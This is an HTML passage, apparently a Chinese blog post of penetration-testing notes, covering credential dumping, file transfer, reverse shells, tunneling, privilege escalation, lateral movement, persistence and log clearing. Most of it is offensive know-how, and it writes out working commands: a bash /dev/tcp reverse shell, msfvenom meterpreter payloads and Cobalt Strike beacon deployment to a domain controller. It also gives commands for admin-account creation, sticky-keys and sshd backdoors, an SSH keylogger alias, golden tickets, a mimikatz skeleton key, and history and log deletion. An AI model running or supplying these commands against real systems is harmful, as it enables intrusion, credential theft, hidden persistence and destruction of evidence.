-<p>域内：需要windows\NTDS下的ntds.dit文件 + sam文件 (同上)+ system32\config\system.hive文件；使用卷影（Volume Shadow Copy）服务查看已被使用文件，在Server系统上有默认的<code>ntdsutil</code>命令进行挂载，其他工具Vssadmin、Vshadow（MS SDK中有，VStudio）、NinjaCopy；</p>
-<p>密码抓取工具：先用<code>esentutil</code>对ntds.dit文件进行修复，再QuarksPwDump、NtdsAudit、minikatz、PowerSpolit（工具集）拉取密码，再网站或彩虹表解密；</p>
-<p>彩虹表-ophcrack；官方扩展工具包procdump+minikatz配合食用；注册表reg save；laZagne自助脚本获取密码；MySQL中<code>.frm .myd .myi</code>分别表示表结构、数据（winhex打开）、索引树（cmd5网站破解）；常用密码破解软件john、Hydra、Hashcat、Medusa；SharpDecryptPwd.exe破解常用软件密码；</p>
-<h4 id="Linux下信息搜集"><a href="#Linux下信息搜集" class="headerlink" title="Linux下信息搜集"></a>Linux下信息搜集</h4><p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp</code>生成小马，上传之后之后chmod，执行得到meterpreter，以<code>./xxx&amp;</code>表示在后台运行；或者shell中<code>python -c &quot;import pty;pty.spwan(&#39;/bin/bash&#39;)&quot;</code>以shell交互执行</p>
-<pre><code>uname -a //获取系统信息
-ps -elf //列出全部进程（快照），在/proc下有所有进程信息
-top //实时任务管理，root的uid=0，普通用户的uid&gt;1000
-last //最近登陆状态
-lastb //最近失败登录，减少爆破用强密码或者更换ssh端口
-service --status -all //查看服务器状态
-iptables //防火墙
-netstat // 网络状态
-</code></pre>
-<p>重要文件目录：</p>
-<p>&#x2F;etc&#x2F;issue登陆提示前的消息；&#x2F;etc&#x2F;lsb-release或&#x2F;redhat-release或&#x2F;os-release中系统版本信息；&#x2F;etc&#x2F;crontab计划任务；</p>
-<p>&#x2F;proc&#x2F;version存放Linux内核版本+gcc版本；&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;version监视内核构建时间；</p>
-<p>&#x2F;var&#x2F;log日志；&#x2F;etc&#x2F;passwd用户+组+id+用户目录；&#x2F;etc&#x2F;shadow存放用户和hash过的密码；</p>
-<p>.ssh文件下&#x2F;id_rsa存放RSA私钥、&#x2F;authorized、&#x2F;id_rsa.pub存放公钥；</p>
-<hr>
-<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>在win中</p>
-<ul>
-<li><p>ftp命令，从攻击机&#x2F;服务器上下载脚本，anonymous进行匿名化；</p>
-</li>
-<li><p>Bitsadmin自带工具，在PS中有wget、curl、iwr等网络下载工具；</p>
-</li>
-<li><p>Certutil还可管理证书<code>C:\Users\Lenovo\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code>中有缓存，Scp：用户@IP；</p>
-</li>
-<li><p>rundll32.exe用于运行下载的dll；</p>
-</li>
-<li><p>PS脚本：IEX函数将字符串当命令执行，-enc接受base64过的命令</p>
-</li>
-</ul>
-<blockquote>
-<p>HTA &#x3D; html app</p>
-</blockquote>
-<p>Linux：wget、curl、netcat、sftp</p>
-<p>脚本：php、py2、py3、perl、javascript、VBscript、ruby、Lua、Bash、R、Powershell、Jscript</p>
-<blockquote>
-<p>B语言后来借MS发展为VB，VBS大多在网页中用，VBA作为宏语言在应用中嵌入使用</p>
-</blockquote>
-<hr>
-<h3 id="反弹SHELL"><a href="#反弹SHELL" class="headerlink" title="反弹SHELL"></a>反弹SHELL</h3><p>反弹shell原因是，方便进行命令输入，且能够看到回显，而且是交互式的；有在线网站生成</p>
-<h4 id="win下反弹shell"><a href="#win下反弹shell" class="headerlink" title="win下反弹shell"></a>win下反弹shell</h4><ol>
-<li><p>由被控制端将cmd进行重定向到网络中控制端的某一正在监听的端口（反向）；被控端重定向cmd到本地的一个端口，由控制端主动连接</p>
-</li>
-<li><p>Mshta.exe：可以解释并执行.hta（可借此利用js、vbs），payload可由MSF生成</p>
-</li>
-<li><p>Rundll32.exe：可以在内存中加载运行.dll文件，payload由MSF生成</p>
-<blockquote>
-<p>区别于rundl132.exe，为蠕虫变种病毒</p>
-</blockquote>
-</li>
-<li><p>Regsvr32.exe：用于注册&#x2F;注销OLE控件，存在于System32文件夹中</p>
-</li>
-<li><p>Curtutil.exe、powershell（代码混淆Invoke-Obfuscation）</p>
-</li>
-<li><p>msiexe.exe：win上的专门安装文件.msi，MSF可以生成payload</p>
-</li>
-</ol>
-<h4 id="Linux下反弹shell"><a href="#Linux下反弹shell" class="headerlink" title="Linux下反弹shell"></a>Linux下反弹shell</h4><p>标准文件描述符：</p>
-<ul>
-<li>0-stdin-将键盘当作输入</li>
-<li>1-stdout-将显示器作为默认输出</li>
-<li>2-stderr-将报错输出默认输出到显示器</li>
-</ul>
-<p>更改标准输出：</p>
-<pre><code class="bash">exec 1&gt;test
-echo &#39;hello world&#39;1&gt;test	//追加的话需要换成“&gt;&gt;”
-</code></pre>
-<p>更改标准输入：</p>
-<pre><code class="bash">read user 键盘输入+回车;	echo $user	//将键盘输入作为user变量的值
-read user 0&lt; test;	echo $user	//将test文件中的内容赋给user变量
-exec 2&gt;test	//将所有的错误显示到test文件中.....................
-</code></pre>
-<p>自定义描述符：</p>
-<pre><code class="bash">exec 5&gt;test; echo&#39;hello&#39; 1&gt;&amp;5	//在test文件中存放‘hello’，&amp;引用文件描述符
-</code></pre>
-<p><code>/dev/null</code>将任何写入该目录下的东西清空，<code>cat /dev/null &gt;test</code>可用于快速清楚test文件中的内容；下面是常用bash反弹shell命令，更多请见[反弹shell](<span class="exturl" data-url="aHR0cHM6Ly93d3cucmV2c2hlbGxzLmNvbS8=">Online - Reverse Shell Generator (revshells.com)<i class="fa fa-external-link-alt"></i></span>)</p>
-<p>被控端<code>bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code>，控制端<code>nc -lvvp IP:Port</code></p>
-<blockquote>
-<p><code>bash -i</code>表示交互式shell，<code>&gt;&amp;</code>用于混合输出（正确错误信息均反弹回来），<code>/dev/tcp</code>通过此文件与目标建立tcp链接，同理也有UDP</p>
-</blockquote>
-<p>反弹shell类型：</p>
-<ol>
-<li>nc进行正向与反向shell+监听，搭配bash</li>
-<li>Perl、PHP、Ruby、Python进行，MSF中可以生成</li>
-<li>Telnet、OpenSSL</li>
-</ol>
-<hr>
-<h3 id="隧道代理搭建"><a href="#隧道代理搭建" class="headerlink" title="隧道代理搭建"></a>隧道代理搭建</h3><p>通常为HTTP代理与Socks代理，前者仅用于传输Web应用，后者使用tcp协议建立在传输层，可应用于telnet、FTP、SMTP等，此外在最新的Socks5中还支持DNS域名解析与IPv6解析；通常用于与DMZ中的机器建立通道，以便后续对内网的扫描等，如果内网机器能出网就反向shell，否则就正向shell</p>
-<ul>
-<li><p>CS中的SMB beacon：</p>
-<ol>
-<li>先开启CS监听器中的beacon SMB</li>
-<li>生成专用SMB木马</li>
-<li>上传至DMZ区中的Web服务器</li>
-<li>使用<code>cpoy 木马 \\域控IP\C$</code>将木马传到域控中</li>
-<li>创建服务<code>sc \\域控IP create 服务名 binpath=&quot;cme.exe /c 木马&quot;</code></li>
-<li>运行该服务<code>sc \\域控IP start 服务名</code></li>
-<li>CS攻击机link域控</li>
-</ol>
-</li>
-<li><p>Socks代理工具：EarthWorm、FRP、ProxyChain、reGeorg、sSocks、SocksCap64；</p>
-<p>MSF中：<code>nmap -A -T4 -p- --script vuln IP</code>扫描指定内网IP段；其中还有Socks5模块；</p>
-</li>
-<li><p>HTTP代理：支持asp、aspx、php、jsp等；工具：Neo-reGeorg；</p>
-</li>
-<li><p>DNS隧道建立工具Dnscat2，分为中继和直连两种模式；本地浏览器会先找<code>C:\\windows\system\drivers\etc\hosts</code>文件后，没有目标后再去寻找DNS服务器，解析类型如下：</p>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>类型</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>A&#x2F;AA</td>
-<td>IPv4&#x2F;IPv6</td>
-</tr>
-<tr>
-<td>CNAME</td>
-<td>域名的别名</td>
-</tr>
-<tr>
-<td>MX</td>
-<td>smtp邮箱的IP地址</td>
-</tr>
-<tr>
-<td>PTR</td>
-<td>IP反查域名</td>
-</tr>
-<tr>
-<td>NS</td>
-<td>指向一个更大的域名服务器</td>
-</tr>
-<tr>
-<td>SRV</td>
-<td>该服务的IP地址</td>
-</tr>
-</tbody></table>
-<ul>
-<li>ICMP隧道：工具Pingtunnel，建立在IP层，最后手段</li>
-</ul>
-<hr>
-<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>可以从系统、开启的应用、服务等入手查找漏洞；包括溢出提权（系统本身）与第三方组件（其他应用）提权；溢出提权又分为本地溢出和远程溢出，后者通过创建用户并上传exp来进行，后者只需要建立连接然后再利用即可</p>
-<p>win：MS06-067、MS08-067、MS10-084、MS11-014、MS11-05、MS12-020、MS16-032；</p>
-<p>Linux：CVE-2017-7308、CVE-2017-6074、CVE-2017-5123、CVE-2016-9793；</p>
-<p>条件：拿到webshell与普通用户权限、具有某些账号与密码、漏洞与exp</p>
-<h4 id="Win下提权"><a href="#Win下提权" class="headerlink" title="Win下提权"></a>Win下提权</h4><p>提权工具：RottenPotato、OriginPotato、SweetPotato、getsystem.exe、RoguePotato；</p>
-<p>wmic命令可以获取杀软、路径、用户组、应用程序、进程等信息，wmic_info.bat脚本进行信息提取，相似的HIGS.bat、winPEAS.bat、Powerless.bat；</p>
-<ul>
-<li><p>内核漏洞：wmic检查版本，powershell列出已安装的安全补丁<code>systeminfo</code>，在[相关提权网站](<span class="exturl" data-url="aHR0cHM6Ly9pLmhhY2tpbmc4LmNvbS90aXF1YW4=">提权辅助网页 Windows提权辅助 (hacking8.com)<i class="fa fa-external-link-alt"></i></span>)查找为进行防护的漏洞</p>
-</li>
-<li><p>系统服务：可信任服务路径；例如<code>C:\\Program Files\x86</code>如果在<code>C:\\Program</code>下有Program.exe则会去执行后面字符串对应的文件；因为在系统盘下，所以会用相应系统权限去运行；以服务种植该木马，并将该马迁移到其他进程中，防止被发现</p>
-</li>
-<li><p>不安全的服务权限：Java升级、AWVS、windows的升级等都需要系统权限；工具accesschk检查易受攻击的服务</p>
-</li>
-<li><p>注册表权限：工具Subinacl查找是否有不安全的注册表、Autorum可以设置自动启动</p>
-</li>
-<li><p>不安全的文件&#x2F;文件夹：.msi会以系统的权限开启（需要注册表中<code>Always Install Elevated</code>开启）</p>
-</li>
-</ul>
-<p>msf：<code>getsystem</code>以命名管道进行提权；<code>exploit/windows/local/bypassuac</code>模块可以对uac（用户账户控制）进行绕过；<code>post/multi/recon/local_exploit_Suggester</code>可以检测win-kernel漏洞；<code>exploit/windows/local/unquoted_service_path</code>对可信任服务路径进行利用;<code>~/service_permissions</code>进行不安全服务的利用；<code>~always_install_elevated</code>对.msi安装模块利用；</p>
-<p>CobalStrick中脚本管理可以安装.cna脚本（一整个包）</p>
-<h4 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h4><p>在LAMP中拿到webshell后得到www-data用户，权限极低；</p>
-<p>信息搜集：脚本linpeas.sh</p>
-<table>
-<thead>
-<tr>
-<th>信息</th>
-<th>路径</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>系统版本</td>
-<td>&#x2F;etc&#x2F;issue；&#x2F;etc&#x2F;*-realease</td>
-</tr>
-<tr>
-<td>内核版本</td>
-<td>uname -a&#x2F;-mrs</td>
-</tr>
-<tr>
-<td>环境变量</td>
-<td>&#x2F;etc&#x2F;profile；&#x2F;etc&#x2F;bashrc</td>
-</tr>
-<tr>
-<td>网络</td>
-<td>&#x2F;etc&#x2F;network&#x2F;interfaces；&#x2F;etc&#x2F;sysconfig&#x2F;network</td>
-</tr>
-<tr>
-<td>应用与服务</td>
-<td>&#x2F;etc&#x2F;services；ps -aux</td>
-</tr>
-<tr>
-<td>计划</td>
-<td>ls -alh；&#x2F;var&#x2F;spool&#x2F;cron</td>
-</tr>
-<tr>
-<td>应用配置</td>
-<td>&#x2F;etc&#x2F;apache2&#x2F;apache2.conf；&#x2F;my.conf（mysql）；&#x2F;httpd&#x2F;conf&#x2F;httpd.conf（nginx）</td>
-</tr>
-<tr>
-<td>网络通信</td>
-<td>netstat -antup</td>
-</tr>
-<tr>
-<td>Arp缓存</td>
-<td>arp -e</td>
-</tr>
-<tr>
-<td>防火墙</td>
-<td>iptables</td>
-</tr>
-<tr>
-<td>敏感信息</td>
-<td>&#x2F;etc&#x2F;passwd；&#x2F;group；&#x2F;shadow</td>
-</tr>
-</tbody></table>
-<p>拿到相关信息之后，在Exp-db中用Search sploit进行搜集</p>
-<ul>
-<li><p>内核提权：脏牛漏洞CVE-2016-5195（适用所有Linux内核2.6.22-3.9之间，32、64位OS）；CVE-2019-13272（适用于内核4.10-5.1.17）；CVE-2022-0874脏管漏洞（匿名管道限制不严格）</p>
-</li>
-<li><p>服务漏洞：dirty_sock（脏袜）漏洞CVE-2019-7304，snap（包管理工具）本地提权（适用于snap版本2.28-2.37，ubuntu18.10&#x2F;18.04LTS&#x2F;16.04LTS&#x2F;14.04LTS）</p>
-</li>
-<li><p>环境变量提权：终端中输入命令，查找PATH进行执行，偷梁换柱</p>
-</li>
-<li><p>Hash：参考1.2中密码文件目录，格式为&#x3D;用户名:密码:UID:GID:else:用户主目录:默认的shell，如果其中的密码显示x则证明密码存放在&#x2F;shadow中，格式为&#x3D;用户名:hash(密码)：x：x：多少天后过期：x：x：过期日期：x</p>
-</li>
-<li><p>sudo滥用：</p>
-</li>
-</ul>
-<pre><code>sudo /etc/sudoers	//配置文件
-sudo /bin/bash;/usr/bin/awk &#39;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#39;
-sudo curl file:///etc/shadow
-find -exec /bin/sh \; -quit
-</code></pre>
-<ul>
-<li><p>定时任务提权：系统定时任务-&#x2F;etc&#x2F;crontab；用户定时任务-&#x2F;var&#x2F;spool&#x2F;cron；<code>crontab</code>查看定时任务（格式&#x3D;分：时：日：月：周：命令）</p>
-</li>
-<li><p>SUID提权：suid&#x3D;super uid；该权限作用于可执行文件上，谁执行后谁就成为属主，此时能够继承创建该文件的人的权限，但仅在运行时有用；</p>
-</li>
-<li><p>隐藏文件：.xx（以.开头的为隐藏文件），<code>find / -name &quot;.*&quot; -type f -exec ls -al &#123;&#125;\;2&gt;/dev/null</code></p>
-</li>
-<li><p>NFS提权：NFS网络文件系统，将目标home目录挂载到本地；<code>showmount -e IP</code>显示可挂载的盘—》在&#x2F;mnt下mkdir—》<code>mount IP:目标 /本地地址</code>—》查找&#x2F;etc&#x2F;passwd下相关UID&amp;GID—》创建对应的组和用户（<code>group add -g GID; adduser 名 -uid UID -gid GID</code>），用以使用该身份提权—》（可选）生成ssh，将公钥放置到目标挂载盘中，方便后续进入</p>
-</li>
-</ul>
-<h4 id="数据库应用提权"><a href="#数据库应用提权" class="headerlink" title="数据库应用提权"></a>数据库应用提权</h4><p>SQLmap即可</p>
-<ol>
-<li><p>在MySql中UDF（用户定义函数）存在于mysql&#x2F;lib&#x2F;plugin&#x2F;下，为udf.dll或udf.so；使用数据流ADS在命令行中进行目录创建<code>echo &quot;xx&quot; &gt;名 :: $INDEX_ALLOCATION</code>（mysql&gt;5.1时没有plugin文件，需要自己创建）</p>
-<p><code>select &#39;xxx&#39; into outfile &#39;C:\\名::$INDEX_ALLOCATION&#39;;</code>创建&#x2F;lib&#x2F;plugin目录</p>
-<ol>
-<li><p>创建临时表，设置一个BLOB（大型二进制文件）类型</p>
-</li>
-<li><p>插入值CONVERT（udf.dll的16进制，CHAR类型）</p>
-</li>
-<li><p>将数据库内容导出为<code>C:\mysql\xxx\lib\plugin\udf.dll</code></p>
-</li>
-<li><p>删除上述表</p>
-</li>
-<li><p><code>create FUNCTION cmdshell returns string soname&#39;udf.dll&#39;;</code></p>
-</li>
-<li><p>输入命令<code>select cmdshell(&quot;whoami&quot;);</code></p>
-</li>
-</ol>
-</li>
-</ol>
-<p>msf中：exploit&#x2F;multi&#x2F;mysql&#x2F;mysql_udf_payload模块</p>
-<ol start="2">
-<li>SQL server：使用<code>net user x x/add &amp; net localgroup administrators x /add</code>增加SA管理员账户，需要sysadmin权限，普通用户无法依靠SQL Server提权（有该权限的话就可以），需要开启xp_cmdshell SQL，语句如下:</li>
-</ol>
-<pre><code class="sql">EXEC sp_configure &#39;show advanced options&#39;,1
-GO
-RECONFIGURE
-GO
-EXEC sp_configure &#39;xp_cmdshell&#39;,1
-GO
-RECONFIGURE
-Go
-</code></pre>
-<p><code>exec master..xp_cmdshell &quot;dos命令&quot;</code>；其他类似存储过程<code>sqlserveragent、sp_oacrate、xp_regwrite</code></p>
-<ol start="3">
-<li>Postgresql：pg_hba.conf具有db的访问权限</li>
-</ol>
-<h4 id="FTP应用提权"><a href="#FTP应用提权" class="headerlink" title="FTP应用提权"></a>FTP应用提权</h4><p>在win下自带的ftp应用中如果权限过高<code>quote site exec net user temp temp /add </code>可以为系统添加temp用户。下面是相关FTP软件的提权</p>
-<ol>
-<li>Serv-U</li>
-</ol>
-<p>默认端口43958，默认管理用户<code>LocalAdministrator-#1@ak#.lk;0@P</code>，在webshell一般没有回显，返回状态<code>200 EXEC command successful</code>表示成功，密码保存在Serv-U目录下的<code>ServUAdmin.exe</code>中，Hex打开；</p>
-<p>或者修改配置文件，直接添加FTP用户；<code>ServUDaemon.ini</code>中保存了所有的ftp账户信息</p>
-<ol start="2">
-<li>G6 FTP</li>
-</ol>
-<p>默认监听端口8021，安装目录下<code>RemoteAdmin/Remote.ini</code>保存着远程管理账户信息，默认以MD5加密。之后使用LXC进行端口转发，本软件不支持远程连接，本地连接成功后新建最高权限FTP用户：</p>
-<p>新建User.bat，并上传，目的是为系统建立一个名为temp，密码为123456的管理员用户</p>
-<pre><code class="cmd">@echo off
-net user temp 123456 /add
-net localgroup administrators temp /add
-</code></pre>
-<ol start="3">
-<li>FileZilla</li>
-</ol>
-<p>默认端口14147，<code>FileZillaServer Interface.xml</code>保存的是所有FTP管理员信息，<code>FileZillaServer.xml</code>保存服务器所有FTP用户信息；默认情况下也不支持远程连接，同样需要端口转发；建立新用户之后并远程连接后：</p>
-<p>设置新用户路径为C盘—登录FTP将<code>C:\Windows\system32\sethc.exe</code>删除并替换为cmd.exe，也就是粘滞键</p>
-<ol start="4">
-<li>FlashFXP</li>
-</ol>
-<p>在其安装目录下，<code>Sites.dat、Stats.dat、quick.dat</code>中保留着历史信息—从服务器下载到本地—并复制到本地FlashFXP下替换—进入软件查看，使用星号密码查看器</p>
-<h4 id="提权辅助"><a href="#提权辅助" class="headerlink" title="提权辅助"></a>提权辅助</h4><ol>
-<li>3389远程桌面服务端口，RDP远程桌面协议，具体端口位置<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\</code>中的PortNumber属性代表终端连接的端口；防御：强口令、换端口；</li>
-<li>端口转发，工具LCX、reDuh</li>
-<li>启动项提权，参考权限维持</li>
-<li>DLL劫持，工具T00ls Lpk Sethc（利用system32下lpk.dll，因为每个exe运行时都要加载这个，且会判断当前文件夹中是否有该dll，没有则再跑到c盘下找）</li>
-</ol>
-<h4 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h4><p>打补丁、及时升级、定时杀毒、关闭危险端口、删除System32下敏感的EXE文件、删除不安全组件、安装一些服务器安全配置软件</p>
-<hr>
-<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>横向移动指的是，在攻破Web服务器后，我们能够对其下内网中的其他机器进行访问与文件传输；这里我们通常指的是Win的域下环境</p>
-<p>利用windows内置工具</p>
-<ol>
-<li><p>IPC+Schtasks(计划任务)&#x2F;AT(老版Schtasks)&#x2F;SC</p>
-<p>IPC$共享命名管道的资源，用于进程间通信，端口135、445开的时候说明目标有该服务；一般来说域中密码基本一致，由域控管理，获得账户密码后，我们对域控进行横向操作</p>
-<ol>
-<li><code>net use \\域控IP\ipc$ /user:账号 &quot;密码&quot;</code>通常使用管理员账号，此时我们可以向域控进行文件传输，方便后续操作</li>
-</ol>
-</li>
-<li><p>SC创建服务执行<code>SC //IP createtest binpath=&quot; &quot; obj=&quot; &quot; password=&quot; &quot;</code></p>
-</li>
-<li><p>WMIC：<code>wmic /node:IP /user:用户 /password:密码 process call</code></p>
-</li>
-<li><p>WinRM：远程管理服务，默认监听5985-http、5986-https</p>
-</li>
-</ol>
-<p>利用外置工具</p>
-<ol>
-<li><p>PsExec.exe、PsExec.py,搭配smbexec.py</p>
-</li>
-<li><p>Wmiexec.vbs（csscript.exe）、wmcmd.exe、wmiHacker（免杀，445端口）</p>
-</li>
-<li><p>pth-winexe：kali自带pth工具集；</p>
-<p>msf中<code>auxiliary/admin/smb/psexec_command</code>模块&amp;<code>exploit/windows/smb/psexec</code>模块；<code>auxiliary/admin/smb/ms17_010_command</code></p>
-</li>
-<li><p>Token窃取：</p>
-<p>win中包括授权D令牌（交互式会话登录）和模拟I令牌（非交互会话），均会在重启之后清除，D令牌所有者注销之后转换为I令牌；</p>
-<p>MSF中<code>load incognito</code>，ms14-068实现域内提权</p>
-<p>CS中hashdump、logonpasswords可用于获取凭证，Portscan可以扫描存活主机，也可以手动引入incognito.exe</p>
-</li>
-<li><p>SharpRDP：impacket套件</p>
-</li>
-</ol>
-<p><strong>域内横向移动</strong>：</p>
-<p>win的认证机制：本地认证、网络认证、域认证；</p>
-<p>在网络认证中主要用于_质询（chalenge&amp;response）_协议（NTLM v1&#x2F;v2&#x2F;session v2）；具体步骤如下;</p>
-<ol>
-<li>客户端向服务端发送请求，</li>
-<li>服务端对客户端验证确实有该用户后，随机生成challenge，再challenge1&#x3D;hash(用户名，challenge)存到内存，返回challenge</li>
-<li>客户端收到challenge通过协商好的算法进行response&#x3D;hash(用户名，challenge)</li>
-<li>客户端发送response与服务端的challenge1对比验证</li>
-</ol>
-<p>域认证基于Kerberos协议：客户向KDC申请，KDC中的AS（检查服务）进行检查生成AD，验证成功之后返回TGT给客户；如果客户想要访问特定服务器需要再次向KDC申请，其中的TGS判断权限合格后返回特定的Ticket</p>
-<table>
-<thead>
-<tr>
-<th>名称</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Ticket</td>
-<td>凭证</td>
-</tr>
-<tr>
-<td>KDC</td>
-<td>密钥分发中心</td>
-</tr>
-<tr>
-<td>TGT</td>
-<td>生成凭证，在内存中</td>
-</tr>
-<tr>
-<td>AD</td>
-<td>存储NTLM hash</td>
-</tr>
-<tr>
-<td>TGS</td>
-<td>票据授予服务</td>
-</tr>
-</tbody></table>
-<p>PTH：哈希传递攻击（445端口、SMB、admin$共享）；msf中<code>auxiliary/admin/smb/psexec_command</code>和用于域和工作组的<code>exploit/windows/smb/psexec</code>；minikatz、powershell、CS、Impacket套件中的wmiexec.py&amp;smbexec.py均可以用于PTH；</p>
-<p>其他还有PTK密钥传递攻击、PTT票据传递攻击</p>
-<hr>
-<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><h4 id="Win下权限维持"><a href="#Win下权限维持" class="headerlink" title="Win下权限维持"></a>Win下权限维持</h4><p>后门安装包含注册表后门（persistence）&amp;服务后门（metsvc）【msf模块】</p>
-<ol>
-<li><p>首先上传vbs，修改为自启动，无需认证</p>
-</li>
-<li><p><code>run metsvc -A</code>设置上述脚本为开机自启动服务型后门（31337端口）</p>
-<p><code>use exploit/multi/handler</code>&amp;<code>set payload windows/metsvc_bind_tcp</code></p>
-</li>
-<li><p>AutorunScript获取shell时自动执行该持续化脚本</p>
-</li>
-</ol>
-<ul>
-<li><p>系统工具替换后门（开机辅助工具）：narrator讲述人劫持、utilman辅助工具管理器等。</p>
-</li>
-<li><p>shift后门：登录windows时，按5次shift，将粘滞键</p>
-</li>
-</ul>
-<p>msf相关利用<code>post/windows/manage/sticky_keys</code>；原理：注册表&#x3D;<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>下寻找目标替换应用，添加<code>debugger</code>参数，将其赋值为后门木马路径</p>
-<p>同理可以更改Notepad，为其添加参数，使得Notepad退出之后能够后台运行后门木马。</p>
-<p>开机自启动注册表项：先后顺序如下</p>
-<p><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>—&gt;<code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>—&gt;<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>—&gt;<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code></p>
-<p>此外<code>\RunOne \RunServiceOnce \Runservices</code>只执行一次</p>
-<p>其他方式：</p>
-<ul>
-<li><p>快捷方式劫持，更改目标文件位置</p>
-</li>
-<li><p>账户隐藏xxx$（net user无法看到，但控制面板能看）</p>
-</li>
-<li><p>后门账号&#x2F;克隆账号（控制面板看不到但注册表一定能看）：</p>
-<ol>
-<li>创建$用户到admin组中</li>
-<li>admin对应的F值赋值给<code>$</code>用户（导出<code>$</code>用户的键值和F值以及admin的F值）</li>
-<li>将admin（F）赋值给$（F），之后删除<code>$</code>用户</li>
-<li>导入<code>$</code>用户的F和键值</li>
-</ol>
-</li>
-<li><p>文件夹启动：<code>C:\Users\Lenovo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></p>
-</li>
-<li><p>服务后门：一般情况下杀软会进行拦截（Task-powershell脚本）</p>
-</li>
-</ul>
-<h4 id="Linux权限维持"><a href="#Linux权限维持" class="headerlink" title="Linux权限维持"></a>Linux权限维持</h4><ul>
-<li><p>软链接sshd：<code>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oport=12345</code></p>
-<ol>
-<li><code>ssh root@IP -p 12345</code>输入任何密码就可以root登录</li>
-</ol>
-</li>
-<li><p>ssh server wrapper：<code>ssh-keygen -t rsa</code>将公钥送到目标靶机上</p>
-</li>
-<li><p>ssh key logger：在靶机.bashrc中添加<code>alias ssh=&#39;strace -o /tmp/sshpwd -&#39;date+%d%h%m%s&#39;.log -e read,write,connect -s2048 ssh&#39;</code>输入的所有键盘记录都会在log中存储</p>
-</li>
-<li><p>Vim中默认含有python扩展</p>
-</li>
-<li><p>alias后门：键盘记录；Crontab后门：定时任务</p>
-</li>
-<li><p>setuid：使文件打开者在使用时拿到所有者权限</p>
-<p>setgid：作用于目录，用户打开该目录后自动加入到该目录所属组</p>
-</li>
-<li><p>文件隐藏touch文件，隐藏权限<code>chattr +i/-i</code>给所属文件加锁用于防止删除</p>
-</li>
-<li><p>命令无痕模式：<code>set +o history</code>（上下键还有，history命令看不出来）</p>
-</li>
-<li><p>删除命令历史：<code>sed -i 100,$d,bash_history</code>删除100行之后的命令；指定行<code>history -d 100</code></p>
-</li>
-</ul>
-<h4 id="域内权限维持"><a href="#域内权限维持" class="headerlink" title="域内权限维持"></a>域内权限维持</h4><ul>
-<li>黄金票据伪造（PTT）</li>
-</ul>
-<p>条件：域名称+域SID+域的KRBTGT的账号密码的hash+伪造用户</p>
-<blockquote>
-<p>whoami &amp; minikatz lasdump::dcsync &#x2F;user:krbtge@域名</p>
-</blockquote>
-<ul>
-<li>minikatz中的Skeleton key</li>
-</ul>
-<p>无需重启，适用于winServer03-12（万能密码，不能该用户，默认‘minikatz’），权限在重新启动之后失效，需要安装<code>privilege::debug &amp;&amp; misc::skeleton</code></p>
-<ul>
-<li>SID history</li>
-</ul>
-<p>用于跟踪安全主体控制用户连接资源时的访问权限：当用户从A域到B域时，SID会变，但是SID History中会保留在A域中的权限；minikatz中<code>privilege::debug &amp;&amp; sid::patch &amp;&amp; sid::add /sam::名 /new:adminstrator</code></p>
-<hr>
-<h3 id="痕迹清除"><a href="#痕迹清除" class="headerlink" title="痕迹清除"></a>痕迹清除</h3><ul>
-<li>windows</li>
-</ul>
-<p>日志位置<code>C:\Windows\System32\winevt\Logs</code>||在win+r中键入<code>eventwr.msc</code>；该日志使用事件查看器打开，包含：应用程序运行记录（Application）、安全账号改动等（Security）、系统驱动和软件崩溃等（System）、设置setup、转发事件；</p>
-<p>wevtutil.exe用于检索、删除、导出等对日志的操作</p>
-<p>msf：<code>net user username /del</code>删除账号，<code>clearv</code>删除日志，<code>sessions -k</code>关闭所有的meterpreter，<code>run event_manager -i/-c</code>i看日志c删除日志</p>
-<p>停止记录日志：ps脚本的Invoke-phantOm，eventlog-&gt; svchost执行</p>
-<ul>
-<li>Linux（）</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>路径</th>
-<th>记录内容</th>
-<th>查看命令</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>&#x2F;var&#x2F;log&#x2F;wtmp</td>
-<td>所有成功的登录记录</td>
-<td>last</td>
-</tr>
-<tr>
-<td>&#x2F;var&#x2F;log&#x2F;btmp</td>
-<td>所有的失败的登陆记录</td>
-<td>lastb（无法修改，在root下删除）</td>
-</tr>
-<tr>
-<td>&#x2F;var&#x2F;log&#x2F;lastlog</td>
-<td>最近登陆记录</td>
-<td>lastlog</td>
-</tr>
-<tr>
-<td>&#x2F;var&#x2F;run&#x2F;utmp</td>
-<td>当前登录用户的信息</td>
-<td>who</td>
-</tr>
-<tr>
-<td>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access.log</td>
-<td>nginx日志</td>
-<td></td>
-</tr>
-<tr>
-<td>&#x2F;var&#x2F;log&#x2F;cron</td>
-<td>定时任务日志</td>
-<td></td>
-</tr>
-<tr>
-<td>&#x2F;var&#x2F;log&#x2F;secure</td>
-<td>授权、账户信息等</td>
